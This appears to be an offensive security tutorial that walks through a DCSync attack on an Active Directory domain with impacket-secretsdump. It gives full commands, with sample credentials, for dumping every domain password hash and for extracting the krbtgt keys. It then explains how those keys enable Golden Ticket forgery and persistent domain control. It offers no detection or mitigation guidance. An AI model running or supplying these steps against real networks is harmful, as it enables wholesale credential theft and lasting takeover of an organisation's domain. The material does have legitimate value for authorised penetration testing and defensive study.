## Prerequisites

- Compromised account with DCSync rights (typically Domain Admin, Enterprise Admin, or accounts with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions)
- Network connectivity to the Domain Controller
- `impacket-secretsdump` tool

## Installation

Install the Impacket toolkit:

```bash
# Using apt (Debian/Ubuntu)
sudo apt install python3-impacket

# Or install from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

## Attack Execution

### Dumping All Domain Credentials

To perform a complete domain credential dump:

```bash
impacket-secretsdump '<DOMAIN>'/'<USERNAME>':'<PASSWORD>'@<DC_FQDN>
```

**Example:**
```bash
impacket-secretsdump 'draven.me'/'EVANGELINE.ISSI':'Draven@123!'@DC1.DRAVEN.ME
```

### Targeting Specific Users

The `krbtgt` account is a critical target as it encrypts all Ticket Granting Tickets (TGTs) in the domain. Compromising this account enables Golden Ticket attacks and complete domain persistence.

To extract only the `krbtgt` credentials:

```bash
impacket-secretsdump 'draven.me'/'EVANGELINE.ISSI':'Draven@123!'@DC1.DRAVEN.ME -just-dc-user krbtgt
```

## Output Analysis

A successful DCSync attack against `krbtgt` yields:

- **NT Hash**: Used for Pass-the-Hash attacks and Golden Ticket generation
- **Kerberos AES Keys** (AES256 and AES128): Modern encryption keys for Kerberos authentication
- **DES Key**: Legacy encryption key (typically disabled in modern environments)

## Impact

Compromising the `krbtgt` account provides:

- **Complete domain control** through Golden Ticket generation
- **Persistent access** (Golden Tickets can be valid for up to 10 years)
- **Ability to forge tickets** for any user, including Domain Admins
- **Bypass of most security controls** as forged tickets appear legitimate